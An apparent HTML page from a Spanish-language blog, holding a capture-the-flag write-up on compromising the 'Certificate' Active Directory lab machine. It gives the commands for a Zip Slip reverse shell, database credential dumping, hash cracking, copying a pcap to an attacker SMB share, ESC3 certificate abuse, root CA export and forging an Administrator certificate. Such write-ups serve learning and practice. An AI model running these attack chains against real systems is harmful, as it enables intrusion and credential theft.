@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Certificate | Borhub Blog</title>
+<meta name="keywords" content="Certificate, Hard, ActiveDirectory, Zip Slip, Zip Concatenation, Mysql, Wireshark, Krb5RoastParser, ESC3, SeManageVolume, Certutil, Certipy Forge">
+<meta name="description" content="Writeup sobre la máquina Certificate en Active Directory de dificultad Hard. Realizando un ataque Zip Slip &#43; Zip Concatenation, conseguiremos una shell como el usuario xampp, después enumerando una base de datos sql conseguiremos la contraseña del usuario sara.b. Dentro de las carpetas de sara.b encontraremos un mensaje sobre el error que tiene WS-01 además de un archivo .pcap, ahora enumeraremos las peticiones kerberos para conseguir los hashes AS-REP, AS-REQ y TGS-REP y crackear la contraseña de lion.k. Nos seguiremos moviendo al siguiente usuario explotando la vuln ESC3 del servidor de Certificados para conseguir el acceso a Ryan.k que nos permitirá luego escalar privilegios. El usuario Ryan.k miembro de Domain Storage Managers y con privilegios SeManageVolume nos permitirá tomar el control sobre C: para luego nosotros mediante certutil exportar el certificado de Root Certificate Authority (CA Raíz) para luego con Certipy Forge forgar un .pfx para administrador, y generar y obtener un TGT &#43; hash del mismo.">
+<meta name="author" content="Borhub">
+<link rel="canonical" href="https://borhuub.github.io/writeups/certificate/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.0c6701118f5c7e049c5fa8762210566ca9a5a1174e56560126f872ccc4e942a1.css" integrity="sha256-DGcBEY9cfgScX6h2IhBWbKmloRdOVlYBJvhyzMTpQqE=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="16x16" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="32x32" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="apple-touch-icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="mask-icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://borhuub.github.io/writeups/certificate/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://borhuub.github.io/writeups/certificate/">
+  <meta property="og:site_name" content="Borhub Blog">
+  <meta property="og:title" content="Certificate">
+  <meta property="og:description" content="Writeup sobre la máquina Certificate en Active Directory de dificultad Hard. Realizando un ataque Zip Slip &#43; Zip Concatenation, conseguiremos una shell como el usuario xampp, después enumerando una base de datos sql conseguiremos la contraseña del usuario sara.b. Dentro de las carpetas de sara.b encontraremos un mensaje sobre el error que tiene WS-01 además de un archivo .pcap, ahora enumeraremos las peticiones kerberos para conseguir los hashes AS-REP, AS-REQ y TGS-REP y crackear la contraseña de lion.k. Nos seguiremos moviendo al siguiente usuario explotando la vuln ESC3 del servidor de Certificados para conseguir el acceso a Ryan.k que nos permitirá luego escalar privilegios. El usuario Ryan.k miembro de Domain Storage Managers y con privilegios SeManageVolume nos permitirá tomar el control sobre C: para luego nosotros mediante certutil exportar el certificado de Root Certificate Authority (CA Raíz) para luego con Certipy Forge forgar un .pfx para administrador, y generar y obtener un TGT &#43; hash del mismo.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:tag" content="Certificate">
+    <meta property="article:tag" content="Hard">
+    <meta property="article:tag" content="ActiveDirectory">
+    <meta property="article:tag" content="Zip Slip">
+    <meta property="article:tag" content="Zip Concatenation">
+    <meta property="article:tag" content="Mysql">
+    <meta property="og:image" content="https://borhuub.github.io/logo_machines/certificate.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://borhuub.github.io/logo_machines/certificate.png">
+<meta name="twitter:title" content="Certificate">
+<meta name="twitter:description" content="Writeup sobre la máquina Certificate en Active Directory de dificultad Hard. Realizando un ataque Zip Slip &#43; Zip Concatenation, conseguiremos una shell como el usuario xampp, después enumerando una base de datos sql conseguiremos la contraseña del usuario sara.b. Dentro de las carpetas de sara.b encontraremos un mensaje sobre el error que tiene WS-01 además de un archivo .pcap, ahora enumeraremos las peticiones kerberos para conseguir los hashes AS-REP, AS-REQ y TGS-REP y crackear la contraseña de lion.k. Nos seguiremos moviendo al siguiente usuario explotando la vuln ESC3 del servidor de Certificados para conseguir el acceso a Ryan.k que nos permitirá luego escalar privilegios. El usuario Ryan.k miembro de Domain Storage Managers y con privilegios SeManageVolume nos permitirá tomar el control sobre C: para luego nosotros mediante certutil exportar el certificado de Root Certificate Authority (CA Raíz) para luego con Certipy Forge forgar un .pfx para administrador, y generar y obtener un TGT &#43; hash del mismo.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Writeups",
+      "item": "https://borhuub.github.io/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Certificate",
+      "item": "https://borhuub.github.io/writeups/certificate/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Certificate",
+  "name": "Certificate",
+  "description": "Writeup sobre la máquina Certificate en Active Directory de dificultad Hard. Realizando un ataque Zip Slip + Zip Concatenation, conseguiremos una shell como el usuario xampp, después enumerando una base de datos sql conseguiremos la contraseña del usuario sara.b. Dentro de las carpetas de sara.b encontraremos un mensaje sobre el error que tiene WS-01 además de un archivo .pcap, ahora enumeraremos las peticiones kerberos para conseguir los hashes AS-REP, AS-REQ y TGS-REP y crackear la contraseña de lion.k. Nos seguiremos moviendo al siguiente usuario explotando la vuln ESC3 del servidor de Certificados para conseguir el acceso a Ryan.k que nos permitirá luego escalar privilegios. El usuario Ryan.k miembro de Domain Storage Managers y con privilegios SeManageVolume nos permitirá tomar el control sobre C: para luego nosotros mediante certutil exportar el certificado de Root Certificate Authority (CA Raíz) para luego con Certipy Forge forgar un .pfx para administrador, y generar y obtener un TGT + hash del mismo.",
+  "keywords": [
+    "Certificate", "Hard", "ActiveDirectory", "Zip Slip", "Zip Concatenation", "Mysql", "Wireshark", "Krb5RoastParser", "ESC3", "SeManageVolume", "Certutil", "Certipy Forge"
+  ],
+  "articleBody": "\nReconocimiento en red ❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.71 -oG ports [sudo] contraseña para borhub: Lo siento, pruebe otra vez. [sudo] contraseña para borhub: Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-19 19:40 +0200 Initiating SYN Stealth Scan at 19:40 Scanning 10.10.11.71 [65535 ports] Discovered open port 80/tcp on 10.10.11.71 Discovered open port 445/tcp on 10.10.11.71 Discovered open port 53/tcp on 10.10.11.71 Discovered open port 135/tcp on 10.10.11.71 Discovered open port 139/tcp on 10.10.11.71 Discovered open port 49666/tcp on 10.10.11.71 Discovered open port 49712/tcp on 10.10.11.71 Discovered open port 49687/tcp on 10.10.11.71 Discovered open port 636/tcp on 10.10.11.71 Discovered open port 49706/tcp on 10.10.11.71 Discovered open port 593/tcp on 10.10.11.71 Discovered open port 49685/tcp on 10.10.11.71 Discovered open port 49731/tcp on 10.10.11.71 Discovered open port 9389/tcp on 10.10.11.71 Discovered open port 88/tcp on 10.10.11.71 Discovered open port 464/tcp on 10.10.11.71 Discovered open port 49686/tcp on 10.10.11.71 Discovered open port 3268/tcp on 10.10.11.71 Discovered open port 3269/tcp on 10.10.11.71 Discovered open port 389/tcp on 10.10.11.71 Completed SYN Stealth Scan at 19:41, 26.35s elapsed (65535 total ports) Nmap scan report for 10.10.11.71 Host is up, received user-set (0.037s latency). Scanned at 2025-08-19 19:40:55 CEST for 26s Not shown: 65515 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 53/tcp open domain syn-ack ttl 127 80/tcp open http syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 49666/tcp open unknown syn-ack ttl 127 49685/tcp open unknown syn-ack ttl 127 49686/tcp open unknown syn-ack ttl 127 49687/tcp open unknown syn-ack ttl 127 49706/tcp open unknown syn-ack ttl 127 49712/tcp open unknown syn-ack ttl 127 49731/tcp open unknown syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 26.41 seconds Raw packets sent: 131063 (5.767MB) | Rcvd: 30 (1.320KB) ❯ ports.py ports 🔍 Puertos encontrados: ➜ 53 ➜ 80 ➜ 88 ➜ 135 ➜ 139 ➜ 389 ➜ 445 ➜ 464 ➜ 5 ➜ 593 ➜ 636 ➜ 3268 ➜ 3269 ➜ 9389 ➜ 49666 ➜ 49685 ➜ 49686 ➜ 49687 ➜ 49706 ➜ 49712 ➜ 49731 ¡Puertos copiados en el portapapeles! ❯ sudo nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49666,49685,49686,49687,49706,49712,49731 10.10.11.71 -oN targeted Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-19 19:42 +0200 Nmap scan report for 10.10.11.71 Host is up (0.12s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30) |_http-title: Did not follow redirect to http://certificate.htb/ |_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-08-20 01:41:57Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name) |_ssl-date: 2025-08-20T01:43:28+00:00; +7h59m38s from scanner time. | ssl-cert: Subject: commonName=DC01.certificate.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026#x3C;unsupported\u003e, DNS:DC01.certificate.htb | Not valid before: 2024-11-04T03:14:54 |_Not valid after: 2025-11-04T03:14:54 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.certificate.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026#x3C;unsupported\u003e, DNS:DC01.certificate.htb | Not valid before: 2024-11-04T03:14:54 |_Not valid after: 2025-11-04T03:14:54 |_ssl-date: 2025-08-20T01:43:29+00:00; +7h59m38s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name) |_ssl-date: 2025-08-20T01:43:28+00:00; +7h59m38s from scanner time. | ssl-cert: Subject: commonName=DC01.certificate.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026#x3C;unsupported\u003e, DNS:DC01.certificate.htb | Not valid before: 2024-11-04T03:14:54 |_Not valid after: 2025-11-04T03:14:54 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.certificate.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026#x3C;unsupported\u003e, DNS:DC01.certificate.htb | Not valid before: 2024-11-04T03:14:54 |_Not valid after: 2025-11-04T03:14:54 |_ssl-date: 2025-08-20T01:43:29+00:00; +7h59m38s from scanner time. 9389/tcp open mc-nmf .NET Message Framing 49666/tcp open msrpc Microsoft Windows RPC 49685/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49686/tcp open msrpc Microsoft Windows RPC 49687/tcp open msrpc Microsoft Windows RPC 49706/tcp open msrpc Microsoft Windows RPC 49712/tcp open msrpc Microsoft Windows RPC 49731/tcp open msrpc Microsoft Windows RPC Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2025-08-20T01:42:52 |_ start_date: N/A | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required |_clock-skew: mean: 7h59m37s, deviation: 0s, median: 7h59m37s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 99.37 seconds Enumeración web Una vez entramos dentro a la web, vemos que se trata de una plataforma para aprender en linea. En ella también tenemos la capacidad de registrarnos y de iniciar sesión.\nUna vez iniciamos sesión, vemos que tenemos un nuevo apartado de cursos.\nEntonces pruebo a pinchar en alguno de los diferentes cursos que vemos y aunque el curso tiene un precio, podemos enrolar el curso para poder hacer-lo.\nHecho esto, nos aparece un apartado más abajo con las diferentes clases y algún apartado practico en el cual tenemos que subir el archivo del ejercicio.\nZip Slip Attack + Zip Concatenation En este caso vamos a llevar a cabo un ataque Zip Slip, que es una vulnerabilidad crítica de directory traversal en operaciones de descompresión de archivos ZIP. La explotación se basa en el hecho de que la aplicación descomprime archivos sin validar adecuadamente los nombres de los archivos contenidos dentro del ZIP.\nzip pdf.zip ejemplo.pdf python3 zip-slip-exploit-example/evilarc.py -d 10 -o win revershe_shell.php cat pdf.zip evil.zip \u003e archivos.zip 7z l archivos.zip nc -lvnp 4444 Enumeración de archivos del sistema Al parecer encontramos las credenciales que usa la aplicación web para acceder a la base de datos de mysql:\ntype db.php Pero si seguimos enumerando, vemos un montón de archivos interesantes para llevar a cabo nuestro siguiente movimiento.\nLlegamos a la carpeta raíz del servidor xampp, en el cual tenemos archivos interesantes como passwords.txt, C:\\xampp\\mysql\\bin\\my.ini y C:\\xampp\\phpMyAdmin\\config.inc.php .\nEnumeración SQL - Mysql Visto esto, parece que para entrar a la base de datos solo necesitamos lo que que sería las credenciales default. Ahora navegamos a la carpeta mysql\\bin, en el cual esta el archivo ejecutable de mysql.\nEn un principio intento que se me abra un prompt donde yo ir escribiendo los comandos, pero al no funcionar-me uso la opción -e para ejecutar las querys que necesito.\n.\\mysql.exe -u root -h 127.0.0.1 -P 3306 -e \"SHOW DATABASES;\" .\\mysql.exe -u root -h 127.0.0.1 -P 3306 --database=certificate_webapp_db -e \"SHOW TABLES;\" .\\mysql.exe -u root -h 127.0.0.1 -P 3306 --database=certificate_webapp_db -e \"SELECT * FROM USERS;\" Nos copiamos todo el listado y lo metemos en el archivo sql_users. Y ahora para craquear los hashes, vamos crear un archivo con solo los usuarios y los hashes separados por : haciendo uso de regex:\ncat sql_users | awk 'NR\u003e1 {print 4$, $6}' | tr \" \" \":\" \u003e hashes Opción Descripción awk 'NR\u003e1 {print 4$, $6}' Con NR\u003e1 dejamos de mostrar la primera linea.Con {print $4, $6} mostramos solo las columnas 4 y 6. tr \" \" “:” Cambiamos los espacios por : Ahora vamos a creackear los hashes, aunque nuestro objetivo es el usuario sara.b . Primero, identificamos el hash como bcrypt y así sabemos que tenemos que usar el tipo de hash 3200 en hashcat.\nY ahora ejecutamos el crackeo con la opción --username para indicar que hemos añadido los usuarios en el archivo con los hash.\nhashcat -m 3200 --force --username -a 0 hashes /usr/share/SecLists/Password/Leaked-Databases/rockyou.txt Y así obtenemos el hash para nuestro usuario objetivo sara.b:Blink182. Comprobación de credenciales:\nnxc winrm 10.10.11.71 -u sara.b -p Blink182 Enumeración archivos usuario sara.b Con evil-winrm nos abrimos la shell de sara.b para seguir enumerando las carpetas. De momento no tenemos la userflag pero descubrimos un mensaje y un archivo .pcap relacionado con el equipo WS-01.\nY aquí el mensaje sobre los problemas que están teniendo:\nFile Download Ahora nos montamos un servidor SMB en nuestra máquina atacante para así descargarnos el archivo .pcap.\n#Maquina atacante sudo smbserver.py smbFolder $(pwd) -smb2support -username borhub -password borhubpass #Maquina victima net use x: \\\\10.10.14.214\\smbFolder /user:borhub borhubpass copy C:\\Users\\Sara.B\\Documents\\WS-01\\WS-01_PktMon.pcap x:\\WS-01_PktMon.pcap Enumerando el .pcap con Wireshark Una vez abrimos el archivo .pcap con Wireshark , vemos muchos tipos de protocolos que esta vez no nos interesan.\nNosotros estamos buscando las comunicaciones de autenticación NTLM que hayan dentro del archivo, con lo cual filtramos por el protcolo NTLMSSP.\nY ya rápidamente observamos lo que sería el paquete de autenticación (AUTH) dentro de una Session Setup Request de SMB2\nFlujode paquetes NTLM dentro de SMB/SMB2 Antes de seguir con el pentest, me parece interesante entender que tenemos enfrente. Para ello vamos a explicar paso a paso que significa cada paquete que hemos visto en el archivo.\nConstruir HASH NTLMv2 Ahora que ya sabemos lo que esta ocurriendo en los paquetes, vamos a proceder con los requisitos.\nNT Proof son los primeros 16bytes (32 hex) de la respuesta NTLM en el paquete AUTH.\nNTLMv2 Bloof es el resto de la respuesta NTLM en el paquete AUTH.\nUsername Domain Server_Challenge NT_proof NTLMv2_bloof Administrator WS-01 0f18018782d74f81 16bytes NTLM response Resto del NTLM response # Hash Administrator::WS-01:0f18018782d74f81:3ff29ba4b51e86ed1065c438b6713f28:01010000000000000588e3da922edb012a49d5aaa4eeea0c00000000020016004300450052005400490046004900430041005400450001000800440043003000310004001e00630065007200740069006600690063006100740065002e Y ahora tratamos de crackear el hash NTLMv2 para ver la contraseña de administrador local de la workstation WS-01. \"chido\"..*7¡Vamos!\nLuego pruebo las credenciales con todos los usuarios del sistema, pero ninguna parece coincidir.\nnxc smb 10.10.11.71 -u users -p password Kerberos autentication - Krb5RoastParser Hasta el momento no hemos conseguido nada con los hash NTLMv2 pero sabemos que hay otras formas de autenticación en el sistema.\nKrb5RoastParser Github\nAsí que usando este repositorio vamos a encontrar paquetes y los hashes de la autenticación mediante kerberos.\nTenemos tres tipos de hash que podemos encontrar según la opción que indiquemos en el comando:\nHash Descripción AS-REQ Pre-Auth Roasting AS-REP AS-REP Roasting TGS-REP Kerberoasting (Tickets de servicio) python krb5_roast_parser.py ../WS-01_PktMon.pcap as_req python krb5_roast_parser.py ../WS-01_PktMon.pcap as_rep python krb5_roast_parser.py ../WS-01_PktMon.pcap tgs_rep Y ahora probamos a crackear los diferentes hashes. En este caso en el AS-REP obtenemos las credenciales para el usuario Lion.K:!QAZ2wsx.\nhashcat -m 19900 as_req_hash /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt Comprobamos las credenciales y encontramos la user flag en el escritorio del usuario Lion.K\nnxc smb 10.10.11.71 -u Lion.SK -p '!QAZ2wsx' evil-winrm -i 10.10.11.71 -u Lion.SK -p '!QAZ2wsx' Bloodhound Enumeration Haciendo uso de bloodhound-python, recogemos toda la información disponible en el dominio para luego con BloodhoundCE analizarlo.\nbloodhound-python -u Lion.SK -p '!QAZ2wsx' -d certificate.htb -ns 10.10.11.71 -c all --zip Vemos que pertenece a varios grupos aunque nos interesa el grupo DOMAIN CRA MANAGERS, el cual tiene que ver con AD CS.\nThe members of this security group are responsible for issuing and revoking multiple certificates for the domain users\nEntonces vamos a tratar con certipy buscar plantillas de certificados vulnerables, pero antes vamos a solicitar un TGT (Ticket Garanting Ticket) para autenticar-nos a través de kerberos con el usuario Lion y a configurar nuestro archivo krb5.conf.\nESC3: Enrollment Agent Certificate Template Ahora haciendo uso de certipy buscamos plantillas vulnerables con -vulnerable.\ncertipy find -k -dc-host DC01.certificate.htb -vulnerable -stdout Vemos que la plantilla de certificados Delegated-CRA, es vulnerable a ESC3. Y que además tiene el Enrollment Agent True.\nEsc3 Enrollment Agent Template\nPero para conseguir llegar a cabo este vector de ataque, necesitamos otro Template que sea de Client Authentication y que este habilitado.\nSi volvemos a tirar el certipy pero esta vez sin el comando -vulnerable. Vemos todas las plantillas disponibles, y enumerando-las manualmente vemos que el Template SignedUser es vulnerable a ESC3 ya que esta habilitado y tiene el Client Authentication: True, además nos encontramos con el siguiente mensaje:\nThis is not a vulnerability by itself. See the wiki for more details. Template requires a signature with the Certificate Request Agent application policy\nY como nosotros tenemos la otra plantilla vulnerable a Enrollment Agent, podemos llevar a cabo el ataque ESC3.\ncertipy find -k -dc-host DC01.certificate.htb -stdout Entonces empezamos el ataque solicitando un certificado de Enrollment Agent para nuestro usuario actual con el siguiente comando:\ncertipy req -k -dc-host DC01.certificate.htb -ca Certificate-LTD-CA -template DELEGATED-CRA Una vez con el certificado para nuestro usuario vamos a solicitar otro impersonando al usuario Ryan.K, ya que cuando lo intentabamos con Administrator no nos ha sido posible.\ncertipy find -k -dc-host DC01.certificate.htb -template SignedUser -pfc lion.sk.pfx -on-behalf-of 'certificate\\ryan.k' Y vemos que esta vez hemos podido obtener el archivo .pfx de ryan.k . Con lo cual, el siguiente paso es solicitar un TGT de Kerberos con certipy auth.\ncertipy auth -pfx 'ryan.k.pfx -dc-ip '10.10.11.71' Procedo a comprobar las credenciales:\nnxc smb certificate.htb --use-kcache Enumerando permisos del grupo Domain Storage Managers. Ahora si volvemos a mirar el bloodhound del usuario Ryan.K, vemos que pertenece a un grupo interesante llamado Domain Storage Managers.\nThe members of this security group are responsible for volume-level tasks such as maintaining, defragmenting and managing partitions and disks.\nIniciamos una shell como el usuario ryan.k haciendo uso de evil-winrm y del hash obtenido anteriormente.\nevil-winrm -i 10.10.11.71 -u ryan.k -H b1bc3d70e70f4f36b1509a65ae1a2ae6 Explotando el privilegio SeManageVolume Si miramos los permisos con el siguiente comando, observamos que tenemos el privilegio SeManageVolumePrivilege que permite ejecutar operaciones directas sobre volúmenes, incluyendo leer sectores en bruto del disco.\nwhoami /priv Buscando por internet, encuentro un exploit para aprovechar el permiso SeManageVolumePrivilege .\nHTB PivotAPI more\nSeManageVolumeAbuse Github\nEntonces lo subimos compilado a la maquina victima usando la utilidad upload de evil-winrm.\nupload SeManageVolumeExploit.exe Y ahora ejecutamos el .exe y vemos que todo funciona correctamente.\nEnumerar y exportar certificados de ryan.k - Certutil Y si ahora miramos los certificados de nuestro usuario con certutil , vemos que tenemos varios certificados interesantes como Root Certification Authority.\nLa Root Certification Authority (CA Raíz) es la máxima autoridad de confianza en una jerarquía Public Key Infrastructure (PKI), y con la cual podemos exportar un archivo .pfx que nos permitirá generar un certificado para Administrador.\ncertutil -Store My Entonces, el siguiente paso es con certutil exportar el certificado a un archivo .pfx usando la opción -exportPFX .\ncertutil -exportPFX My 75b2f4bbf31f108945147b466131bdca rootcert.pfx En el caso de que intentemos exportar el certificado sin haber ejecutado el exploit anterior nos dará el siguiente error:\nY esto ocurre ya que no tenemos la capacidad de acceder a la clave privada ya que no se encuentra en nuestro almacén personal, sino en algún otro lugar del sistema al que no podemos acceder con un usuario no privilegiado.\nAhora con el certificado ya en nuestro poder, nos lo descargamos a nuestra máquina atacante:\ndownload cert.pfx Solicitar certificado de Administrador - Certipy Forge Ahora con la opción Forge de Certipy, vamos a crear un certificado .pfx como administrador haciendo uso de la Root CA.\ncertipy forge -ca-pfx cert.pfx -upn Administrator@certificate.hbt -sid Ahora con certipy auth solicitamos un TGT y obtenemos el HASH de Administrator.\ncertipy auth -pfx 'administrator_forged.pfx' -dc-ip '10.10.11.71' Y ahora haciendo PassTheHash iniciamos sesión como administrador en el dominio a través de Evil-Winrm.\n",
+  "wordCount" : "2514",
+  "inLanguage": "en",
+  "image":"https://borhuub.github.io/logo_machines/certificate.png","datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Borhub"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://borhuub.github.io/writeups/certificate/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Borhub Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://borhuub.github.io/%3Clink%20/%20abs%20url%3E"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://borhuub.github.io/" accesskey="h" title="Home (Alt + H)">
+                <img src="https://borhuub.github.io/apple-touch-icon.png" alt="" aria-label="logo"
+                    height="35">Home</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://borhuub.github.io/writeups/" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://borhuub.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://borhuub.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://borhuub.github.io/writeups/">Writeups</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Certificate
+    </h1>
+    <div class="post-description">
+      Writeup sobre la máquina Certificate en Active Directory de dificultad Hard. Realizando un ataque Zip Slip &#43; Zip Concatenation, conseguiremos una shell como el usuario xampp, después enumerando una base de datos sql conseguiremos la contraseña del usuario sara.b. Dentro de las carpetas de sara.b encontraremos un mensaje sobre el error que tiene WS-01 además de un archivo .pcap, ahora enumeraremos las peticiones kerberos para conseguir los hashes AS-REP, AS-REQ y TGS-REP y crackear la contraseña de lion.k. Nos seguiremos moviendo al siguiente usuario explotando la vuln ESC3 del servidor de Certificados para conseguir el acceso a Ryan.k que nos permitirá luego escalar privilegios. El usuario Ryan.k miembro de Domain Storage Managers y con privilegios SeManageVolume nos permitirá tomar el control sobre C: para luego nosotros mediante certutil exportar el certificado de Root Certificate Authority (CA Raíz) para luego con Certipy Forge forgar un .pfx para administrador, y generar y obtener un TGT &#43; hash del mismo.
+    </div>
+    <div class="post-meta"><span>12 min</span>&nbsp;·&nbsp;<span>2514 words</span>&nbsp;·&nbsp;<span>Borhub</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#reconocimiento-en-red" aria-label="Reconocimiento en red">Reconocimiento en red</a></li>
+                <li>
+                    <a href="#enumeraci%c3%b3n-web" aria-label="Enumeración web">Enumeración web</a><ul>
+                        
+                <li>
+                    <a href="#zip-slip-attack--zip-concatenation" aria-label="Zip Slip Attack &#43; Zip Concatenation">Zip Slip Attack + Zip Concatenation</a></li>
+                <li>
+                    <a href="#enumeraci%c3%b3n-de-archivos-del-sistema" aria-label="Enumeración de archivos del sistema">Enumeración de archivos del sistema</a></li>
+                <li>
+                    <a href="#enumeraci%c3%b3n-sql---mysql" aria-label="Enumeración SQL - Mysql">Enumeración SQL - Mysql</a></li></ul>
+                </li>
